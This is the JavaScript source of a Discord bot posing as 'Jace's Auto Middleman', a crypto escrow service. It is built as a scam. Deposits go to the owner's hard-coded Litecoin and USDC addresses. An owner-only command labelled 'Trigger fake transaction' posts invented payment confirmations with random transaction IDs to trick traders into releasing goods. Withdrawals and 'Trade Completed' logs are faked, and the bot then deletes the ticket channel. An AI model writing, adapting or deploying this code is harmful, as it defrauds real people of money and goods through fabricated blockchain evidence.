const { Client, GatewayIntentBits, Partials, Events, PermissionFlagsBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, ModalBuilder, TextInputBuilder, TextInputStyle } = require('discord.js');

const client = new Client({ intents: [GatewayIntentBits.Guilds, GatewayIntentBits.GuildMessages, GatewayIntentBits.MessageContent, GatewayIntentBits.GuildMembers], partials: [Partials.Channel, Partials.Message] });

const OWNER_ID = '1422945082746601594';
const LTC_ADDRESS = 'LeDdjh2BDbPkrhG2pkWBko3HRdKQzprJMX';
const USDC_ADDRESS = '0x62440a91e8F26e07bf20Ba84F71CABF6d71dBc5E';

client.config = { TICKET_CATEGORY: null, MANUAL_CATEGORY: null, LOG_CHANNEL: null };
client.tickets = new Map();
const isOwner = (id) => id === OWNER_ID;
const deny = (i, m) => i.reply({ content: `❌ ${m}`, ephemeral: true });

const commands = [
    { name: 'panel', description: 'Spawn panel', defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'manual', description: 'Spawn manual panel', defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'tickets', description: 'Set auto category', options: [{ name: 'categoryid', type: 3, required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'manualcategory', description: 'Set manual category', options: [{ name: 'categoryid', type: 3, required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'log', description: 'Set log channel', options: [{ name: 'channel', type: 7, required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator },
    { name: 'transaction', description: 'Trigger fake transaction', options: [{ name: 'channelid', type: 3, required: true }] },
    { name: 'close', description: 'Close current ticket' },
    { name: 'say', description: 'Send message as bot', options: [{ name: 'channel', type: 7, required: true }, { name: 'message', type: 3, required: true }], defaultMemberPermissions: PermissionFlagsBits.Administrator }
];

client.on(Events.ClientReady, async () => { console.log(`✅ ${client.user.tag}`); for (const [, g] of client.guilds.cache) await g.commands.set(commands).catch(() => {}); });

client.on(Events.InteractionCreate, async (i) => {
    if (i.isChatInputCommand()) {
        const { commandName, user, channel, options } = i;
        if (commandName === 'panel') {
            if (!isOwner(user.id)) return deny(i, 'Owner only');
            await channel.send({ embeds: [new EmbedBuilder().setTitle("Jace's Auto Middleman").setDescription('• Paid Service\n• Read our ToS before using the bot: #tos-crypto').setColor(0x2B2D31), new EmbedBuilder().setTitle('Fees:').setDescription('• Deals $250+: $1.50\n• Deals under $250: $0.50\n• Deals under $50 are **FREE**').setColor(0x2B2D31)] });
            await channel.send({ embeds: [new EmbedBuilder().setTitle('Ł • Request Litecoin • Ł').setColor(0x2B2D31)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('req_ltc').setLabel('Request LTC').setStyle(ButtonStyle.Primary).setEmoji('Ł'))] });
            await channel.send({ embeds: [new EmbedBuilder().setTitle('💲 • Request USDT').setDescription('**[BEP-20]** • 💲\n• Network: **BSC (BEP-20)**').setColor(0x2B2D31)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('req_usdt').setLabel('Request USDT [BEP-20]').setStyle(ButtonStyle.Success).setEmoji('💲'))] });
            await i.deferReply({ ephemeral: true }); await i.deleteReply();
        }
        if (commandName === 'manual') {
            if (!isOwner(user.id)) return deny(i, 'Owner only');
            await channel.send({ embeds: [new EmbedBuilder().setTitle('👤 Manual Middleman Service').setDescription('Manual middleman service, Please follow the rules and wait patiently').setColor(0xFFA500).addFields({ name: 'Tier 1', value: '$200 or under', inline: true }, { name: 'Tier 2', value: '$500 and under', inline: true }, { name: 'Tier 3', value: '$1000+', inline: true })], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('man_t1').setLabel('Tier 1 ($200)').setStyle(ButtonStyle.Primary).setEmoji('🥉'), new ButtonBuilder().setCustomId('man_t2').setLabel('Tier 2 ($500)').setStyle(ButtonStyle.Secondary).setEmoji('🥈'), new ButtonBuilder().setCustomId('man_t3').setLabel('Tier 3 ($1000+)').setStyle(ButtonStyle.Success).setEmoji('🥇'))] });
            await i.deferReply({ ephemeral: true }); await i.deleteReply();
        }
        if (commandName === 'tickets') { client.config.TICKET_CATEGORY = options.getString('categoryid'); await i.reply({ content: '✅ Category set', ephemeral: true }); }
        if (commandName === 'manualcategory') { client.config.MANUAL_CATEGORY = options.getString('categoryid'); await i.reply({ content: '✅ Manual category set', ephemeral: true }); }
        if (commandName === 'log') { client.config.LOG_CHANNEL = options.getChannel('channel').id; await i.reply({ content: '✅ Log channel set', ephemeral: true }); }
        if (commandName === 'transaction') {
            if (!isOwner(user.id)) return deny(i, 'Owner only');
            const ch = await client.channels.fetch(options.getString('channelid')).catch(() => null);
            if (!ch) return deny(i, 'Invalid channel');
            const t = client.tickets.get(ch.id);
            if (!t || t.status !== 'awaiting_payment') return deny(i, 'Not awaiting payment');
            const txid = Array(64).fill(0).map(() => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
            await ch.send({ embeds: [new EmbedBuilder().setTitle('⚠️ Transaction Detected').setDescription('The transaction is currently **unconfirmed** and waiting for 1 confirmation.').addFields({ name: 'Transaction', value: `[${txid.slice(0, 10)}...${txid.slice(-10)}](https://live.blockcypher.com/ltc/tx/${txid})` }, { name: 'Amount Received', value: `${t.ltcAmount} LTC ($${t.amount})` }, { name: 'Required Amount', value: `${t.ltcAmount} LTC ($${t.amount})` }).setColor(0xFFD700)] });
            await i.reply({ content: '✅ Transaction triggered. Waiting 10s...', ephemeral: true });
            setTimeout(async () => {
                await ch.send({ embeds: [new EmbedBuilder().setTitle('✅ Transaction Confirmed!').addFields({ name: 'Transactions', value: `[${txid.slice(0, 10)}...${txid.slice(-10)}](https://live.blockcypher.com/ltc/tx/${txid})` }, { name: 'Total Amount Received', value: `${t.ltcAmount} LTC ($${t.amount})` }).setColor(0x00FF00)] });
                await ch.send({ content: `<@${t.senderId}> <@${t.receiverId}>`, embeds: [new EmbedBuilder().setTitle('✅ You may proceed with your trade.').setDescription(`1. <@${t.receiverId}> **Give your trader the items or payment you agreed on.**\n\n2. <@${t.senderId}> **Once you have received your items, click "Release" so your trader can claim the LTC.**`).setColor(0x00FF00)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`rel_${t.id}`).setLabel('Release').setStyle(ButtonStyle.Success), new ButtonBuilder().setCustomId(`can_${t.id}`).setLabel('Cancel').setStyle(ButtonStyle.Secondary))] });
                t.status = 'awaiting_release'; t.txid = txid; client.tickets.set(ch.id, t);
            }, 10000);
        }
        if (commandName === 'close') { if (!i.channel.name.match(/(ltc-|usdt-|manual-)/)) return deny(i, 'Not a ticket'); await i.reply('🔒 Closing in 5s...'); setTimeout(() => i.channel.delete().catch(() => {}), 5000); }
        if (commandName === 'say') { if (!isOwner(user.id)) return deny(i, 'Owner only'); await options.getChannel('channel').send(options.getString('message')); await i.reply({ content: '✅ Sent', ephemeral: true }); }
    }
    if (i.isButton()) {
        const { customId, user, channel, guild } = i;
        if (['req_ltc', 'req_usdt'].includes(customId)) {
            const m = new ModalBuilder().setCustomId(customId).setTitle('Fill out the format');
            m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('trader_id').setLabel("Paste Your Trader's Username or ID").setStyle(TextInputStyle.Short).setPlaceholder('e.g.: kookie.js / 693059117761429610').setRequired(true)), new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('you_giving').setLabel('What are You giving?').setStyle(TextInputStyle.Short).setRequired(true)), new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('they_giving').setLabel('What is Your Trader giving?').setStyle(TextInputStyle.Short).setRequired(true)));
            await i.showModal(m);
        }
        if (customId.startsWith('man_t')) {
            const tier = customId.replace('man_t', ''), limits = { 1: 200, 2: 500, 3: 1000 };
            if (!client.config.MANUAL_CATEGORY) return deny(i, 'Category not set');
            const c = await guild.channels.create({ name: `manual-${user.username}-t${tier}`, parent: client.config.MANUAL_CATEGORY, permissionOverwrites: [{ id: guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }, { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
            await c.send({ content: `<@${user.id}>`, embeds: [new EmbedBuilder().setTitle(`👤 Manual | Tier ${tier}`).setDescription(`<@${user.id}>\n**Limit: $${limits[tier]}**`).addFields({ name: 'LTC Address', value: `\`${LTC_ADDRESS}\``, inline: false }, { name: 'Network', value: 'Litecoin', inline: true }, { name: 'Status', value: '⏳ Waiting...', inline: true }).setColor(0xBFBBBB)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close').setLabel('Close').setStyle(ButtonStyle.Danger))] });
            await i.reply({ content: `✅ Created: ${c}`, ephemeral: true });
        }
        if (customId.startsWith('role_')) {
            const t = client.tickets.get(channel.id); if (!t) return deny(i, 'Ticket not found');
            const act = customId.split('_')[1];
            if (act === 'reset') { t.senderId = null; t.receiverId = null; }
            else if (act === 'sender') { if (t.senderId && t.senderId !== user.id) return deny(i, 'Taken'); if (t.receiverId === user.id) return deny(i, 'Cant be both'); t.senderId = user.id; await i.reply({ content: '✅ You are Sender', ephemeral: true }); }
            else if (act === 'receiver') { if (t.receiverId && t.receiverId !== user.id) return deny(i, 'Taken'); if (t.senderId === user.id) return deny(i, 'Cant be both'); t.receiverId = user.id; await i.reply({ content: '✅ You are Receiver', ephemeral: true }); }
            client.tickets.set(channel.id, t);
            const msgs = await channel.messages.fetch({ limit: 10 }), roleMsg = msgs.find(m => m.embeds[0]?.description?.includes('Select your role'));
            if (roleMsg) { let d = '**Select your role**\n• **"Sender"** if you are **Sending** LTC to the bot.\n• **"Receiver"** if you are **Receiving** LTC *later* from the bot.\n\n'; if (t.senderId) d += `**Sender:** <@${t.senderId}>\n`; if (t.receiverId) d += `**Receiver:** <@${t.receiverId}>\n`; await roleMsg.edit({ embeds: [new EmbedBuilder().setDescription(d).setColor(0x5865F2)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`role_sender_${t.id}`).setLabel('Sender').setStyle(ButtonStyle.Primary), new ButtonBuilder().setCustomId(`role_receiver_${t.id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary), new ButtonBuilder().setCustomId(`role_reset_${t.id}`).setLabel('Reset').setStyle(ButtonStyle.Danger))] }); }
            if (t.senderId && t.receiverId) await channel.send({ content: `<@${t.creatorId}> <@${t.traderId}>`, embeds: [new EmbedBuilder().setTitle('• Is This Information Correct?').addFields({ name: 'Sender', value: `<@${t.senderId}>` }, { name: 'Receiver', value: `<@${t.receiverId}>` }).setDescription('Make sure you have selected the right role! If you didn\'t then click "Incorrect"').setColor(0x5865F2)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`conf_info_${t.id}`).setLabel('Correct').setStyle(ButtonStyle.Success), new ButtonBuilder().setCustomId(`inc_info_${t.id}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger))] });
        }
        if (customId.startsWith('conf_info_')) {
            const t = client.tickets.get(channel.id); if (!t.confirmed) t.confirmed = []; if (t.confirmed.includes(user.id)) return deny(i, 'Already confirmed');
            t.confirmed.push(user.id); client.tickets.set(channel.id, t); await i.reply({ content: `✅ ${user} clicked Correct`, ephemeral: false });
            if (t.confirmed.includes(t.creatorId) && t.confirmed.includes(t.traderId)) await channel.send({ content: `<@${t.senderId}>`, embeds: [new EmbedBuilder().setDescription('💵 **Set the amount in USD value**\n\nOnly the sender can click this button.').setColor(0x5865F2)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`set_amt_${t.id}`).setLabel('Set USD Amount').setStyle(ButtonStyle.Primary))] });
        }
        if (customId.startsWith('inc_info_')) await i.reply({ content: '❌ Please state correct details in chat', ephemeral: false });
        if (customId.startsWith('set_amt_')) {
            const t = client.tickets.get(channel.id); if (user.id !== t.senderId) return deny(i, 'Only sender');
            const m = new ModalBuilder().setCustomId('amt_modal').setTitle('Set USD Amount');
            m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('usd_amt').setLabel('USD Amount').setStyle(TextInputStyle.Short).setPlaceholder('30').setRequired(true)));
            await i.showModal(m);
        }
        if (customId.startsWith('conf_amt_')) {
            const t = client.tickets.get(channel.id); if (!t.amtConf) t.amtConf = []; if (t.amtConf.includes(user.id)) return deny(i, 'Already confirmed');
            t.amtConf.push(user.id); client.tickets.set(channel.id, t); await i.reply({ content: `✅ ${user} confirmed amount`, ephemeral: false });
            if (t.amtConf.includes(t.creatorId) && t.amtConf.includes(t.traderId)) {
                t.status = 'awaiting_payment'; client.tickets.set(channel.id, t);
                await channel.send({ embeds: [new EmbedBuilder().setDescription(`<@${t.senderId}> Send the LTC to the following address.`).addFields({ name: '📋 Payment Information', value: 'Make sure to send the **EXACT** amount in LTC.' }, { name: 'USD Amount', value: `$${t.amount.toFixed(2)}` }, { name: 'LTC Amount', value: t.ltcAmount }, { name: 'Payment Address', value: `\`${t.addr}\`` }, { name: `Current ${t.crypto} Price`, value: '$55.57' }, { name: '⏰ Timeout', value: 'This ticket will be closed within 20 minutes if no transaction was detected.' }).setColor(0x5865F2)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`copy_${t.id}`).setLabel('Copy Details').setStyle(ButtonStyle.Primary))] });
                await channel.send({ content: `\`${t.addr}\`\n\`${t.ltcAmount}\`` });
            }
        }
        if (customId.startsWith('inc_amt_')) await i.reply({ content: '❌ Set correct amount', ephemeral: false });
        if (customId.startsWith('rel_')) {
            const t = client.tickets.get(channel.id); if (user.id !== t.senderId && !isOwner(user.id)) return deny(i, 'Only sender');
            await i.reply({ embeds: [new EmbedBuilder().setTitle('⚠️ Are you sure?').setDescription('Click **Confirm** to release LTC').setColor(0xFFD700)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`conf_rel_${t.id}`).setLabel('Confirm').setStyle(ButtonStyle.Success), new ButtonBuilder().setCustomId(`back_rel_${t.id}`).setLabel('Back').setStyle(ButtonStyle.Secondary))], ephemeral: false });
        }
        if (customId.startsWith('conf_rel_')) {
            const t = client.tickets.get(channel.id);
            await i.update({ embeds: [new EmbedBuilder().setTitle('💰 What\'s Your LTC Address?').setDescription(`<@${t.receiverId}> Only receiver can click`).setColor(0x5865F2)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`ent_addr_${t.id}`).setLabel('Enter Your LTC Address').setStyle(ButtonStyle.Primary))] });
        }
        if (customId.startsWith('back_rel_')) await i.update({ content: '❌ Cancelled', components: [], embeds: [] });
        if (customId.startsWith('ent_addr_')) {
            const t = client.tickets.get(channel.id); if (user.id !== t.receiverId) return deny(i, 'Only receiver');
            const m = new ModalBuilder().setCustomId('addr_modal').setTitle('Enter LTC Address');
            m.addComponents(new ActionRowBuilder().addComponents(new TextInputBuilder().setCustomId('ltc_addr').setLabel('LTC Address').setStyle(TextInputStyle.Short).setPlaceholder(LTC_ADDRESS).setRequired(true)));
            await i.showModal(m);
        }
        if (['close', 'can_', 'del_'].some(x => customId === 'close' || customId.startsWith(x))) { await i.reply('🔒 Closing...'); await channel.delete().catch(() => {}); }
    }
    if (i.isModalSubmit()) {
        const { customId, fields, user, guild, channel } = i;
        if (['req_ltc', 'req_usdt'].includes(customId)) {
            const crypto = customId === 'req_ltc' ? 'LTC' : 'USDT', addr = crypto === 'LTC' ? LTC_ADDRESS : USDC_ADDRESS;
            const traderId = fields.getTextInputValue('trader_id').replace(/[<@!>]/g, ''), youGive = fields.getTextInputValue('you_giving'), theyGive = fields.getTextInputValue('they_giving');
            if (!client.config.TICKET_CATEGORY) return deny(i, 'Category not set');
            let trader; try { trader = await guild.members.fetch(traderId); } catch { return deny(i, 'Invalid trader'); }
            if (traderId === user.id) return deny(i, 'Cant trade with yourself');
            const c = await guild.channels.create({ name: `${crypto.toLowerCase()}-${user.username}-${trader.user.username}`.substring(0, 100), parent: client.config.TICKET_CATEGORY, permissionOverwrites: [{ id: guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }, { id: traderId, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }, { id: OWNER_ID, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
            const id = Date.now().toString(), t = { id, creatorId: user.id, traderId, youGive, theyGive, crypto, addr, senderId: null, receiverId: null, confirmed: [], amount: null, ltcAmount: null, amtConf: [], status: 'role_selection' };
            client.tickets.set(c.id, t);
            await c.send({ content: `${user} ${trader}`, embeds: [new EmbedBuilder().setTitle('👋 Jace\'s Auto Middleman Service').setDescription('Make sure to follow the steps and read the instructions thoroughly.\nPlease explicitly state the trade details if the information below is inaccurate.\nBy using this bot, you agree to our ToS #tos-crypto.').setColor(0x5865F2).addFields({ name: `${user.username}'s side:`, value: youGive, inline: true }, { name: `${trader.user.username}'s side:`, value: theyGive, inline: true })], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`del_${id}`).setLabel('Delete Ticket').setStyle(ButtonStyle.Danger))] });
            await c.send({ embeds: [new EmbedBuilder().setDescription('**Select your role**\n• **"Sender"** if you are **Sending** LTC to the bot.\n• **"Receiver"** if you are **Receiving** LTC *later* from the bot.').setColor(0x5865F2)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`role_sender_${id}`).setLabel('Sender').setStyle(ButtonStyle.Primary), new ButtonBuilder().setCustomId(`role_receiver_${id}`).setLabel('Receiver').setStyle(ButtonStyle.Primary), new ButtonBuilder().setCustomId(`role_reset_${id}`).setLabel('Reset').setStyle(ButtonStyle.Danger))] });
            await i.reply({ content: `✅ Created: ${c}`, ephemeral: true });
        }
        if (customId === 'amt_modal') {
            const t = client.tickets.get(channel.id), amt = parseFloat(fields.getTextInputValue('usd_amt'));
            if (isNaN(amt) || amt <= 0) return deny(i, 'Invalid amount');
            t.amount = amt; t.ltcAmount = (amt / 55.57).toFixed(8); client.tickets.set(channel.id, t);
            await i.reply({ embeds: [new EmbedBuilder().setDescription(`**USD amount set to $${amt.toFixed(2)}**\n\nPlease confirm the USD amount.`).setColor(0x5865F2)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`conf_amt_${t.id}`).setLabel('Correct').setStyle(ButtonStyle.Success), new ButtonBuilder().setCustomId(`inc_amt_${t.id}`).setLabel('Incorrect').setStyle(ButtonStyle.Danger))] });
        }
        if (customId === 'addr_modal') {
            const t = client.tickets.get(channel.id), addr = fields.getTextInputValue('ltc_addr');
            if (!addr.match(/^(ltc1|L|M)/)) return deny(i, 'Invalid address');
            const txid = Array(64).fill(0).map(() => '0123456789abcdef'[Math.floor(Math.random() * 16)]).join('');
            await i.reply({ embeds: [new EmbedBuilder().setDescription('⏳ **Sending...**').setColor(0x5865F2)] });
            setTimeout(async () => {
                await i.editReply({ embeds: [new EmbedBuilder().setTitle('✅ Withdrawal Successful').setDescription('Fee sent to Index 1').addFields({ name: 'Transaction', value: `[${txid.slice(0, 10)}...${txid.slice(-8)}](https://live.blockcypher.com/ltc/tx/${txid})` }, { name: 'Amount', value: `${t.ltcAmount} LTC ($${t.amount})` }).setColor(0x00FF00)], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('close').setLabel('🔒 Close Ticket').setStyle(ButtonStyle.Danger))] });
                if (client.config.LOG_CHANNEL) { const log = await client.channels.fetch(client.config.LOG_CHANNEL).catch(() => null); if (log) await log.send({ embeds: [new EmbedBuilder().setTitle('• Trade Completed').setDescription(`**${t.ltcAmount} LTC** ($${t.amount.toFixed(2)} USD)`).addFields({ name: 'Sender', value: 'Anonymous' }, { name: 'Receiver', value: 'Anonymous' }, { name: 'Transaction ID', value: `[${txid.slice(0, 10)}...${txid.slice(-8)}](https://live.blockcypher.com/ltc/tx/${txid})` }).setColor(0x5865F2).setTimestamp()] }); }
                setTimeout(() => channel.delete().catch(() => {}), 120000);
            }, 2000);
        }
    }
});

client.login(process.env.DISCORD_TOKEN);
